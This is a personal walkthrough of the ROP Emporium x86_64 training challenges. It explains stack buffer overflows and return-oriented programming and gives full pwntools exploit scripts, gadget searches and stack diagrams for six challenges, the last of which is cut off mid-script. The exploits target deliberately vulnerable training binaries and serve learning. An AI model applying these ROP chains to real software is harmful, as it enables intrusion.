
# General overview 

The rop emporium is a series of challenges designed to help teach about the concept of [[return oriented programing (ROP)]] which is an exploit technique that uses already existing chunks of machine code in an binary as part of the executable. This is an effective way of getting around [[write xor execut w^x stack protection]].

They attempt to:
>ROP Emporium provides a series of challenges that are designed to teach ROP in isolation, with minimal requirement for reverse-engineering or bug hunting. Each challenge introduces a new concept with slowly increasing complexity.

While the challenges are supplied in [[x86]], [[x86_64 amd]], [[ARM]]v5 & [[MIPS]] binary format, I will be doing the challenge in the [[x86_64 amd]] format for easy use on my personal computer.

In order to attack these challenges, I will primarily be using [[GDB]] with [[pwndbg]] as my debugger and the [[pwntools]] [[Python]] library to craft my exploits. In particular the [[ropper]] tool built into [[pwndbg]] is being used to find the [[useful rop gadgets]]. Some of the [[rabin2]] functions are also very useful in understanding what is in the binary.


## Challenge 1 Ret2win

This challenge introduces the concept of a buffer overflow and controlling the instruction pointer of an executable. An important thing to know is that all the computer does is look at a chunk of binary in memory and then execute what it tells the computer to do. Then it looks at the next chunk of memory and so on and so forth.

However, occasionally the code needs to jump to other parts of code in order to function correctly (think of an if statement or a loop). To do this the computer simply reads an instruction that tells it to jump to a different part of code, say 20 values up/down from where it is now. 

That works great for loops and if statements, but programmers often want to call code from many different parts of the program (think functions). So in the middle of doing A, I want the program to stop, go do B, then come back and finish A. I also want to be able to do that while doing C, D, and F. The problem for the program, is once it finishes B, where does it go back to, A, C, D or F. It has to store that information somewhere and it is stored on the stack, which can be considered the memory of every function. The first thing a function does is store where it should return to on the stack and the last thing a function does is tell the computer to return back to that location.

What we are going to try and do is change that value on the stack so when the program returns to that stored location it returns to where we want it to go.

We see from running the ret2win binary that it will "attempt to fit 56 bytes of user input into 32 bytes of stack buffer!" and after looking at the stack in [[pwndbg]] we are able to see the following layout:

> ./ret2win 
	ret2win by ROP Emporium
	x86_64
	For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
	What could possibly go wrong?
	You there, may I have your input please? And don't worry about null bytes, we're using read()!

All local variables are on the stack and a base pointer (which we don't have to worry about). So assuming there are no other local variables, there is 40 bytes bytes between the read and the return pointer. We can craft a payload like this:
```
        | stack          |
        | -------------- |
8 bytes | start buffer   |
8 bytes | buffer         |
8 bytes | buffer         |
8 bytes | buffer         |
8 bytes | base pointer   |
8 bytes | return pointer | # where we are going to return to
8 bytes | -------------- |

```
By writing in the first 32+8 bytes of garbage, we are then able to write whatever we want into the return pointer. So all we have to do is look to see what the value should be.
```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
...
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
...
pwndbg>
```

Looking at the functions in the binary we see there is one called ret2win or return here to win which seems super promising. Piecing that all together and we get the following exploit.

```python
from pwn import *

io = process('./ret2win')


# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xcafebabe)*2

new_IP = p32(0x00400756) # The ret2win pointer

payload = junk + new_bp +  new_IP

# Print the payload for debugging puropses
print("The payload is:")
print(payload)

# wait for debugger to be attached
input("Hit enter to apptempt exploit")

# read the output and send the payload
print(io.clean(0.5).decode("utf-8"))
io.send(junk+new_bp + new_IP)



# Once done debugging, read the output
input("exploit sent hit enter to end")
print(io.clean(0.5).decode("utf-8"))


```

The exploit will print out the pid of the process and then wait in order to attach gdb with `gdb -p $pid` for debugging it live.

---

## Challenge 2: Split
> The elements that allowed you to complete ret2win are still present, they've just been split apart.  Find them and recombine them using a short ROP chain.


This is the first challenge that really gets into the coolness of ROP exploits. 

Where before we just needed to execute the ret2win function, now there is no single place we need to return to. However, there are 2 parts of code (which are disconnected) that we need to execute in this binary. We first need to place a pointer to the "/bin/cat flag.txt" string into rdi (which is where the first argument to a function is stored) and then we need to cause a system call to happen. Luckily the string and system call already exist in the program so all we have to do is put them together.


When we search within [[pwndbg]] for ways to edit the value of $rdi we get the following:

```
pwndbg> ropper -- --search "pop rdi"
[INFO] File: /tmp/tmplhu8fdig
0x00007ffff7fec24b: pop rdi; jne 0x7ffff80675b8; add rdx, 8; add rax, 3; mov qword ptr [rdi], rdx; ret;
0x00007ffff7fd09c1: pop rdi; pop rbp; ret;
0x00000000004007c3: pop rdi; ret;
```
The pop instruction takes the top value on the stack and places it in the register. Since we control the stack with our buffer overflow, we can control that value and make it whatever we want. The last one shown is ideal for us in this situation as it doesn't cause another bad side effects.

When we print the functions we can also see a location for the system call.
```
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400550 GLOBAL FUNC       puts
2   0x00400560 GLOBAL FUNC       system

```

So what we want to do is run 2 instructions sets, the first starting at 0x40073c and then jump to 0x400560. Luckily the first 2 instructions end with a ret instruction which jumps to the instructions held at the top of the stack. So we want the stack to look like this

```
        | stack          |
        | -------------- |
8 bytes | start buffer   |
8 bytes | buffer         |
8 bytes | buffer         |
8 bytes | buffer         |
8 bytes | base pointer   |
8 bytes | pop rdi loc    | # gadget to control rdi
8 bytes | ptr to string  | # the value we want to place in rdi
8 bytes | system call loc| # the system call function we want to call
8 bytes | -------------- |

```


This stack overwrite causes the pwnme function to return to the pop rdi instruction. The location of the "/bin/cat flag.txt" string is then placed into the rdi register. The program then returns to the system call location and prints the flag.

```python
#!/usr/bin/python3

from pwn import *

io = process('./split')
# The amount to fill the buffer
junk = b'A' * 0x20
# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xcafebabe)*2

# This is the vaddr of system
# First return to the location of the pop rdi
pop_rdi = p64(0x004007c3)

# The address of the "/bin/cat flag.txt"
addr_of_command = p64(0x00601060)

call_system = p64(0x00400560)
back_junk = b"B" * 20

payload = junk + new_bp + pop_rdi  + addr_of_command +  call_system
payload += back_junk

print("The payload is:")
print(payload)

input("Hit enter to apptempt exploit")
print(io.clean(0.5).decode("utf-8"))
io.send(payload)
print(io.clean(0.5).decode("utf-8"))
input("exploit sent hit enter to end")
sleep(1)
```

## Challenge 3

With the first real ROP challenge completed, let's start getting into some of the fun stuff. While unintended gadgets are super fun to play with, it's also super useful to be able to call intended functions and that is what this challenge deals with. 

Before we go into the challenge, let's take a quick look at how function arguments are passed from caller to callie which is actually system dependent. In x86_64, both the stack and the registers are used, but in practice it's really just the registers. The first 4 arguments are placed in registers, then the rest are pushed onto the stack before the call.

| 64-bit register | 32-bit sub-register | 16-bit sub-register | 8-bit sub-register | Notes               |
| --------------- | ------------------- | ------------------- | ------------------ | ------------------- |
| %rcx            | %ecx                | %cx                 | %cl                | Counter & 4th arg   |
| %rdx            | %edx                | %dx                 | %dl                | 3rd arg             |
| %rsi            | %esi                | %si                 | %sil               | 2nd arg             |
| %rdi            | %edi                | %di                 | %dil               | 1st call argument |

So, if we have the following function:

```C
int foo(int var1, int var2, int var3){
	stuff
}
```

and we wanted to call the function as `foo(1,2,3);` then we would have to place 1 in rdi, 2 in rsi, and 3 in rdx.

With that background covered, let's look at the challenge:

> You must call the `callme_one()`, `callme_two()` and `callme_three()` functions in that order, ~~each with the arguments `0xdeadbeef`, `0xcafebabe`, `0xd00df00d` e.g. `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)` to print the flag~~. ==**For the x86_64 binary** double up those values, e.g. `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`==

First things first, let's just focus on doing it for callme_one. We need to find gadgets that will let us control the values of rdi, rsi, and rdx. The simplest way is to pop them off the stack because we already control that. So let's search for pop rdi in the binary.

```
pwndbg> ropper -- --search "pop rdi"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /root/working/callme/callme_64/callme
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; 
0x00000000004009a3: pop rdi; ret; 

```


Will you look at that, that's super useful (it's also there intentionally, hint `disass usefulGagets`).

With that gadget we can set all of the arguments to the callme functions.

```
         | stack          |
         | -------------- |
32 bytes | start buffer   |
8  bytes | base pointer   | # fill the buffer and base pointer
8  bytes | pop gadget loc | # call 1st gadget to pop off all the vals
8  bytes | 0xdeadbeef...  | # all of the function arguments
8  bytes | 0xcafebabe...  |
8  bytes | 0xd00df00d...  |
8  bytes | callme_1 loc   | # call the first call me function
8  bytes | pop gadget loc | # start again, and call the pop off gadget
8  bytes | 0xdeadbeef...  | # function args again
8  bytes | 0xcafebabe...  |
8  bytes | 0xd00df00d...  |
8  bytes | callme_2 loc   | # call the sec call me function
8  bytes | pop gadget loc | # start again for the last time
8  bytes | 0xdeadbeef...  |
8  bytes | 0xcafebabe...  |
8  bytes | 0xd00df00d...  |
8  bytes | callme_3 loc   | # final call of call me
8  bytes | -------------- |

```

There's just one last thing that we don't know, what values to place into the stack for the callme functions. To do this, we can use the rabin2 tool from before:
```
rabin2 -i callme
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004006d0 GLOBAL FUNC       puts
2   0x004006e0 GLOBAL FUNC       printf
3   0x004006f0 GLOBAL FUNC       callme_three
4   0x00400700 GLOBAL FUNC       memset
5   0x00400710 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00400720 GLOBAL FUNC       callme_one
8   0x00000000 WEAK   NOTYPE     __gmon_start__
9   0x00400730 GLOBAL FUNC       setvbuf
10  0x00400740 GLOBAL FUNC       callme_two
11  0x00400750 GLOBAL FUNC       exit
```

And we are able to get the locations of the callme functions. An important note is that these are in the plt (Procedure Linkage Table), not actually the callme binary. That won't matter for this challenge, but we will have to deal with the plt and how linked binaries work later on.

At this point we have all of the values that we want to put on the stack, so it's just a question of coding up an exploit in python with our trusty pwntools.

```python
#!/usr/bin/python3

from pwn import *
io = process('./callme')

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xcafebabe)*2

# This is the vaddr of system
# First return to the location of the pop rdi
popper = p64(0x0040093c)
call1 = p64(0x00400720)
call2 = p64(0x00400740)
call3 = p64(0x004006f0)

back_junk = b"B" * 20

newbp    = p32(0xba5effff) * 2

d00df00d = p32(0xd00df00d) * 2
deadbeef = p32(0xdeadbeef) * 2
cafebabe = p32(0xcafebabe) * 2

args = deadbeef + cafebabe + d00df00d 

payload = junk + newbp + popper + args +call1 + popper + args + call2 + popper + args + call3

print("The payload is:")
print(payload)

input("Hit enter to apptempt exploit")

print(io.clean(0.5).decode("utf-8"))

io.send(payload)

input("exploit sent hit enter to end")

print(io.clean(0.5).decode("utf-8"))

sleep(1)

```

## Challenge 4


Once more into the breach with these rop exploits friends. We have a pretty simular situation to the 2nd challenge.

> **Important!**  
A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like "flag.txt") as the 1st argument.

All we need to do is call the print_file function with the first argument being a pointer to a string containing "flag.txt". The one problem is a complete lack of that string in the binary. I used `strings` and `rabin2` to attempt to find them and found nothing.

Now considering this challenge is called write4 and it has a whole section on how to write to memory in the challenge description, I deduced I needed to write that string into memory. The challenge sudgests looking for something in the form `mov [reg], reg` so that's what I did.

```

pwndbg> ropper -- --search "mov [???],???
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov [???],???

[INFO] File: /root/working/write4/write4_64/write4
0x0000000000400629: mov dword ptr [rsi], edi; ret; 
0x0000000000400628: mov qword ptr [r14], r15; ret; 

```
and look at that. I found 2 gadgets that might work. Now, I'd rather work with moving as much data at once which means using the r15 (8 bytes) rather then the edi (4 bytes), so that's the one I looked for first. 

```
pwndbg> ropper -- --search "pop r14"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r14

[INFO] File: /root/working/write4/write4_64/write4
0x0000000000400690: pop r14; pop r15; ret; 
```

This provides a perfect gadget to populate the write gadgets with whatever value we want. 

The question now is where to write our string to the binary. So we are going to use the `vmmap` cmd to look at what parts of the memory is writable

```
Looking at the perms on parts of the code we see the following areas are able to be written to
nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
```

Note: the above is trimmed to only show the writable sections

The string is "flag.txt" which is 9 bytes long (including the null byte) which gets rid of a couple of the sections. So I chose the .data section of the binary to write into. 

The last gadget we'll need is something to control rdi for the parameter pass to the print_file

```
pwndbg> ropper -- --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /root/working/write4/write4_64/write4
0x0000000000400693: pop rdi; ret; 
```

Finally let's find the print_file function mentioned in the description.
```
disass print_file
Dump of assembler code for function print_file@plt:
   0x0000000000400510 <+0>:     jmp    QWORD PTR [rip+0x200b0a]        # 0x601020 <print_file@got.plt>
   0x0000000000400516 <+6>:     push   0x1
   0x000000000040051b <+11>:    jmp    0x4004f0
End of assembler dump.
```

Now with all of the information let's craft our stack layout. 

```
         | stack          |
         | -------------- |
32 bytes | start buffer   |
8  bytes | base pointer   | 
8  bytes | pop_r gadget   | # gadget to get values into r14 and r15
8  bytes | write loc      | # place location to write into r14
8  bytes | "flag.txt"     | # 1st 8 bytes of the string
8  bytes | write gadget   | # gadget to write into memory
8  bytes | pop_r gadget   | # do all of that again for the final null byte
8  bytes | "\x00"         | #     Note: bytes after may be init to null 
8  bytes | write loc + 8  | #           so you don't have to do this one
8  bytes | write gadget   |
8  bytes | pop_rdi gadget | # place location of the sring in rdi for 1st param
8  bytes | write loc      | 
8  bytes | print_file loc | # call function to win
8  bytes | -------------- |

```


Coded up this gives the following exploit.

```python
#!/usr/bin/python3

from pwn import *

pop_gaget       = p64(0x0000000000400690)
write_gaget     = p64(0x0000000000400628)
pop_rdi         = p64(0x00400693)
write_loc       = 0x601028
print_file      = p64(0x00400510)
back_junk       = b"B" * 20

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2


"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
def string_place(write_string, write_start):
        returnPayload = b""
        for i in range(0, len(write_string), 8):
                returnPayload += pop_gaget
                #destination
                returnPayload += p64( write_start+ (i))
                temp = write_string[i:i+8] 
                temp += b"\x00" * ( 8 - len(temp) )
                returnPayload += temp
                returnPayload += write_gaget

        return returnPayload

"""
Place the value for the first args of a function
"""
def first_arg(var):
        returnPayload = pop_rdi
        returnPayload += p64(var)
        return returnPayload


io = process('./write4')

# This is the vaddr of system
# First return to the location of the pop rdi
# 4   0x00400510 GLOBAL FUNC       print_file
#Fill up the buffer and the base pointer
payload = junk + new_bp

payload += string_place(b"flag.txt", write_loc)

# This is the vaddr of system
# First return to the location of the pop rdi
payload += first_arg(write_loc)
payload += print_file

payload += back_junk

print("The payload is:")
print(payload)
print("Payload size is:" + str(len(payload)))
input("Hit enter to apptempt exploit")

print(io.clean(0.5).decode("utf-8"))
io.send(payload)
input("exploit sent hit enter to end")
print(io.clean(0.5).decode("utf-8"))

sleep(1)

f = open('./payload', 'wb')
f.write(payload)
f.close()

```

Note: I started writing my exploits into files for easier debugging in gdb. Before I would run the exploit and then attach gdb for debugging with `gdb -p $pid` but now I can just do `r < ./payload` within gdb which is nice



## Challenge 5

Now we have the challenge of dealing with bad chars in our exploit. Not all exploitable programs are so nice to just read in whatever you give it. For example if you are sending a string of text, it may end on a newline, carriage return, or null space. However, you may need these characters to do your dream exploit. 

In order to get around this problem, we have to give the program chars that are accepted then later modify them into what we want. In this exploit, we have to do basically the same thing as the last exploit, however we are unable to pass the characters 'x', 'g', 'a', or '.' and all of those are needed to write in "flag.txt". So what we are going to do is write in some known ("but arbitrary") value's into the location of the bad chars. Then we will use gadgets to modify those values into what we want.

For example, rather then writing 'a' into the binary we write 'b' then we simply subtract 1 from that memory location. 


By this point, I realized that the author of the challenge's had included an 'usefulGadgets' section in the binary (probably should have sooner), so the first thing to do is look over those gadgets and see what we have to work with.

```
pwndbg> disass usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:     xor    BYTE PTR [r15],r14b
   0x000000000040062b <+3>:     ret    
   0x000000000040062c <+4>:     add    BYTE PTR [r15],r14b
   0x000000000040062f <+7>:     ret    
   0x0000000000400630 <+8>:     sub    BYTE PTR [r15],r14b
   0x0000000000400633 <+11>:    ret    
   0x0000000000400634 <+12>:    mov    QWORD PTR [r13+0x0],r12
   0x0000000000400638 <+16>:    ret    
   0x0000000000400639 <+17>:    nop    DWORD PTR [rax+0x0]
End of assembler dump.
```

We can see that we probably need to control r12, r13, r14, r15, and rdi (first arg) in order to make use of these gadgets, so let's see if we have pop's for those.

```
pwndbg> ropper -- --search "pop r1?"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r1?

[INFO] File: /root/working/badchars/badchars_64/badchars
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; 

pwndbg> ropper -- --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /root/working/badchars/badchars_64/badchars
0x00000000004006a3: pop rdi; ret;
```

We can use the same write location from before to make the challenge as well.

We could use any of the xor, add, or sub modifying gadgets there (also or and and gadgets would work), but I'll use the sub gadget. So what we're going to do is place the ascii char 1 value greater in place of every bad char and then just subtract one from each of those location. So the stack will look like the following:

```
         | stack          |
         | -------------- |
32 bytes | start buffer   |
8  bytes | base pointer   | 
8  bytes | pop_r gadget   | # gadget to get values into r12 through r15
8  bytes | "flag.txt"     | # 1st 8 bytes of the string into r12
8  bytes | write loc      | # place location to write into r13
8  bytes | 1              | # the amount to subtract into r14
8  bytes | write loc + 2  | # the loc of the first char to change 'a' into r15
8  bytes | sub gadget     | # gadget to actually modify memory
8  bytes | pop_r + 3      | # pop only r15 off because the other registers can stay the same
8  bytes | write loc + 3  | # loc of 'g'
8  bytes | sub gadget     |
8  bytes | write loc + 4  | # loc of '.'
8  bytes | sub gadget     |
8  bytes | write loc + 6  | # loc of 'x'
8  bytes | sub gadget     | # now flag.txt should be in memory
8  bytes | pop_rdi gadget | # place location of the sring in rdi for 1st param
8  bytes | write loc      | 
8  bytes | print_file loc | # call function to win
8  bytes | -------------- |

```

When I wrote up this exploit, it worked perfectly until I attempted to modify the '.' character and then some of my payload wasn't getting through. After some debugging, I discovered that the location pointer for write_loc+4 actually contained the hex value of one of the bad chars. So after some experimenting, I ended up shifting the location of my write up 3 bytes which is the write_loc + 3 in my exploit. You'll also see a check for bad chars at the end of the exploit so I don't run into that problem again.


```python 
#!/usr/bin/python3

from pwn import *
# pop r12; pop r13; pop r14; pop r15; ret; 
pop_gaget       = p64(0x40069c)
pop_15  = p64(0x4006a2)

# Move [r13] r12
write_gaget     = p64(0x400634)
pop_rdi         = p64(0x4006a3)
write_loc       = 0x601028 + 3
print_file      = p64(0x400620)
back_junk       = b"B" * 20
# sub    BYTE PTR [r15],r14b
sub_gaget = p64(0x0000000000400630)

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2

badChars = b"xga."

"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
        for i in range(0, len(payload), 8):
                continue
            # print(binascii.hexlify(payload[i:i+8]))

def string_place(write_string, write_start):
        returnPayload = b""
        toModify = []
        for i in range(0, len(write_string), 8):
                returnPayload += pop_gaget
                # r12 Value
                temp = write_string[i:i+8]
                # pad in the values so it always fills in all 8 bytes
                temp += b"\x00" * ( 8 - len(temp) )
				
                x = b""
                for j in range(len(temp)):
						
                        #the while loop will keep modifing the value untill it is a good char
                        if temp[j] in badChars:
                                        x += (int(temp[j]) + 1).to_bytes(1, 'big')
											
                                        # this should be the exact memory address of the bad character
                                        toModify.append(write_start + i + j)
                        else:
                                x += temp[j].to_bytes(1, 'big')
                temp = x
                returnPayload += temp
                #destination r13
                returnPayload += p64( write_start+ (i))
                # This is the r14 value
                returnPayload += p64(0x01)
                # This is the r15 value
                returnPayload += p64(0xdeadbeefcafebabe)
                returnPayload += write_gaget
        for i in toModify:
                temp = b""
                temp += pop_15
					
                # This is the r15 value the lopcation to store and subtract from 
                temp += p64(i)
                temp += sub_gaget
                returnPayload += temp
        return returnPayload

"""
Place the value for the first args of a function
"""
def first_arg(var):
        returnPayload = pop_rdi
        returnPayload += p64(var)
        return returnPayload



io = process('./badchars')

#Fill up the buffer and the base pointer
payload = junk + new_bp

payload += string_place(b"./flag.txt", write_loc)

# This is the vaddr of system
# First return to the location of the pop rdi
payload += first_arg(write_loc)
payload += print_file

payload += back_junk


# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))

for i in range(len(payload)):
        if payload[i] in badChars:
                print("Warning bad char detected")
                exit()

input("Hit enter to apptempt exploit")

print(io.clean(0.5).decode("utf-8"))
io.send(payload)
input("exploit sent hit enter to end")
print(io.clean(0.5).decode("utf-8"))
sleep(1)
f = open('./payload', 'wb')
f.write(payload)
f.close()

```

## Challenge 6

We're making good progress and these challenges and we only have a couple more to go, however we won't always have the perfect gadgets available for us to use, and that's what this challenge prepares us for.

The idea is the same as before, write "flag.txt" to the binary and then call the print_file() function with that string as the first argument. So, let's poke around and see what we have to work with.

```
pwndbg> ropper -- --search "mov [%] %"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov [%] %
```

and we find nothing...


The challenge description says:
> **Some useful(?) gadgets are available at the `questionableGadgets` symbol.**

so let's see what we have to work with there.

```
pwndbg> disass questionableGadgets 
Dump of assembler code for function questionableGadgets:
   0x0000000000400628 <+0>:     xlat   BYTE PTR ds:[rbx]
   0x0000000000400629 <+1>:     ret    
   0x000000000040062a <+2>:     pop    rdx
   0x000000000040062b <+3>:     pop    rcx
   0x000000000040062c <+4>:     add    rcx,0x3ef2
   0x0000000000400633 <+11>:    bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:    ret    
   0x0000000000400639 <+17>:    stos   BYTE PTR es:[rdi],al
   0x000000000040063a <+18>:    ret    
   0x000000000040063b <+19>:    nop    DWORD PTR [rax+rax*1+0x0]
End of assembler dump.
```

The only thing that seems super interesting off the bat is the gadget starting at +2. With that gadget we can control $rdx and $rcx. Although I don't know what the `bextr` instruction does, I can guess that we control $rbx as well with that instruction since the inputs are rdx and rcx. Otherwise, I'm guessing the other 2 gadgets are usefullish, so I should probably do some research on understanding what they do.  


First let's look at `bextr` because we're defiantly going to be calling that. From googling I found this [BEXTR — Bit Field Extract](https://www.felixcloutier.com/x86/bextr) manual(?) page that describes it as
> Extracts contiguous bits from the first source operand (the second operand) using an index value and length value specified in the second source operand (the third operand). Bit 7:0 of the second source operand specifies the starting bit position of bit extraction. A START value exceeding the operand size will not extract any bits from the second source operand. Bit 15:8 of the second source operand specifies the maximum number of bits (LENGTH) beginning at the START position to extract. Only bit positions up to (OperandSize -1) of the first source operand are extracted. The extracted bits are written to the destination register, starting from the least significant bit. All higher order bits in the destination operand (starting at bit position LENGTH) are zeroed. The destination register is cleared if no bits are extracted.

Which I found a little confusing, but gave me the idea that this take bits from the first argument and puts them in the destination based on the second argument. Since we control both arguments (rdx and rdc), this confirms my idea that we can control the destination register (rbx in this case).

After a little more googling, I found [this](https://stackoverflow.com/questions/70208751/how-does-the-bextr-instruction-in-x86-work) stack overflow post about someone asking the same question and I found this answer very helpful.

> A picture might help. Say the starting bit is 5 and the length is 9. Then if we have
```
Input : 11010010001110101010110011011010 = 0xd23aacda
                          |-------|
                              \
                               \
                                \
                                 v
                               |-------|
Output: 00000000000000000000000101100110 = 0x00000166
```
> The desired block of bits goes to the least significant bits of the output, and the remaining bits of the output become 0.

So with these 2 explanations combined I was able to get the idea that we take a bit field stored in the first argument and then write a chunk of it into the destination and what chunk depends on the second argument. 

If I set this instruction to start at the 0th bit and copy 64 bits, that means I can copy everything from the second argument into the destination.

So,
```ASM
bextr  rbx,rcx,0xff00
```
and
```
mov  rbx, rcx
```
are equivalent because the ff part says copy everything and the 00 part says start at the 0th bit.




Now let's look at the `xlat   BYTE PTR ds:[rbx]` instruction because we have control of the rbx register in it. From the same website [XLAT/XLATB — Table Look-up Translation](https://www.felixcloutier.com/x86/xlat:xlatb) we get the following description.

> Locates a byte entry in a table in memory, using the contents of the AL register as a table index, then copies the contents of the table entry back into the AL register. The index in the AL register is treated as an unsigned integer. The XLAT and XLATB instructions get the base address of the table in memory from either the DS:EBX or the DS:BX registers (depending on the address-size attribute of the instruction, 32 or 16, respectively). (The DS segment may be overridden with a segment override prefix.)
> ...
> AL ← (RBX + ZeroExtend(AL));

So this instruction writes a value from a table (so a memory location) into AL. Which means if we can get control of this we can write basically any value into AL that exists in the binary which is probably all byte combinations because AL only stores a single byte. The only problem is that it takes AL into account so we need to figure out a way to set AL to a known value.

Looking through the binary, we are able to find an argument that nulls eax which would null out the al register.

```
pwndbg> ropper -- --search "mov ?a?"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov ?a?

[INFO] File: /root/working/fluff/fluff_64/fluff
0x0000000000400610: mov eax, 0; pop rbp; ret; 
```

So now if we use the `bextr` gadget to control rbx and null out eax (and by extension al). We have control over rbx, rcx, rdx, and al. Which is awesome, but still doesn't get us a huge amount closer to writing our string so let's hope the last gadget is usefull.


Looking at the `stos   BYTE PTR es:[rdi],al` instruction we may be in luck. Before even doing any research we can guess that it may write to memory because the first part after the instruction (the destination) is a Byte PTR to memory. In fact it's a pointer control by rdi (which we control), and the second argument is al (which we also control), so we may be in luck.


Ok with hopes high let's look over the [manual page](https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq) for stos. 

> In non-64-bit and default 64-bit mode; stores a byte, word, or doubleword from the AL, AX, or EAX register (respectively) into the destination operand. The destination operand is a memory location, the address of which is read from either the ES:EDI or ES:DI register (depending on the address-size attribute of the instruction and the mode of operation). The ES segment cannot be overridden with a segment override prefix.


This seems to confirm exactly what we wanted. The instruction will store the byte in AL into the destination pointed to by rdi.


So now we have everything we need to write an arbitrary byte to any location in memory and if we do that repeatedly we can write our string. After double checking, we also see that we have a pop rdi gadget we can use to place it and then call the print_file() function. With all of that combined we can make this exploit.

```
pwndbg> ropper -- --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /root/working/fluff/fluff_64/fluff
0x00000000004006a3: pop rdi; ret; 
```

The stack to place one character would be the following.
```
         | stack          |
         | -------------- |
32 bytes | start buffer   |
8  bytes | base pointer   | 
8  bytes | gadget 2       | # gadget to to control rdx, rcx, rbx       
8  bytes | 0xff00         | # control bits for length and starting loc for bextr
8  bytes | rcx val-0x3ef2 | # rcx val that gets copied to rbx, must sub 0x3ef2 because of add inst
8  bytes | null_eax gadget| # set the al value to 0 for the xlat instruction
8  bytes | 0xdeadbeef     | # extra junk because pop rbp is in the null eax gadget
8  bytes | gadget 1       | # place they byte at [rbx+al] into al             
8  bytes | pop rdi gadget | # place the location to write to in rdi
8  bytes | write_loc      | #                                                               
8  bytes | Gadget 3       | # Places al into [rdi]
8  bytes | -------------- |

```
```
   0x0000000000400628 <+0>:     xlat   BYTE PTR ds:[rbx]        # Gadget 1
   0x0000000000400629 <+1>:     ret    
   0x000000000040062a <+2>:     pop    rdx                      # Gadget 2
   0x000000000040062b <+3>:     pop    rcx
   0x000000000040062c <+4>:     add    rcx,0x3ef2
   0x0000000000400633 <+11>:    bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:    ret    
   0x0000000000400639 <+17>:    stos   BYTE PTR es:[rdi],al     # Gadget 3
   0x000000000040063a <+18>:    ret    

```

After coding up my first exploit it would fail after writing a couple of characters. It took a little debugging, but I found out that the read would only read in 512 characters and my exploit was close to 900 which was way to long. So I went back and found a couple of areas that I could trim down the exploit. For example, I discovered that the stosb instruction incremented the destination by 1 every time it was run, so after setting rdi once, I didn't have to continue to reset it. I also saw that rdx was never touched, so it could be set once. After trimming down the exploit I was left with this.
```Python
#!/usr/bin/python3

from pwn import *

write_loc 	= 0x601029
print_file 	= p64(0x400620)

target		= "./fluff"
back_junk 	= b"B" * 20

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2
badChars = b"xga."

# 0040069a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
pop_rbx_size = 0
rdx_set = False
# unpacker_64 = make_unpacker(64)
def pop_rbx(rbx):
	global unpacker_64
	global rdx_set
	if not rdx_set:
		returnPayload = p64(0x40062a)
		#rdx val, control for bextr
		# should start at bit 0 and then copy 64 bit
		returnPayload += p64(0xff00)
		rdx_set = True
	else:
		returnPayload = p64(0x40062a + 1)
	# rcx val
	# this will get placed into rbx after + 0x3ef2
	returnPayload += p64( (rbx) - 0x3ef2)
	global pop_rbx_size
	pop_rbx_size += len(returnPayload)
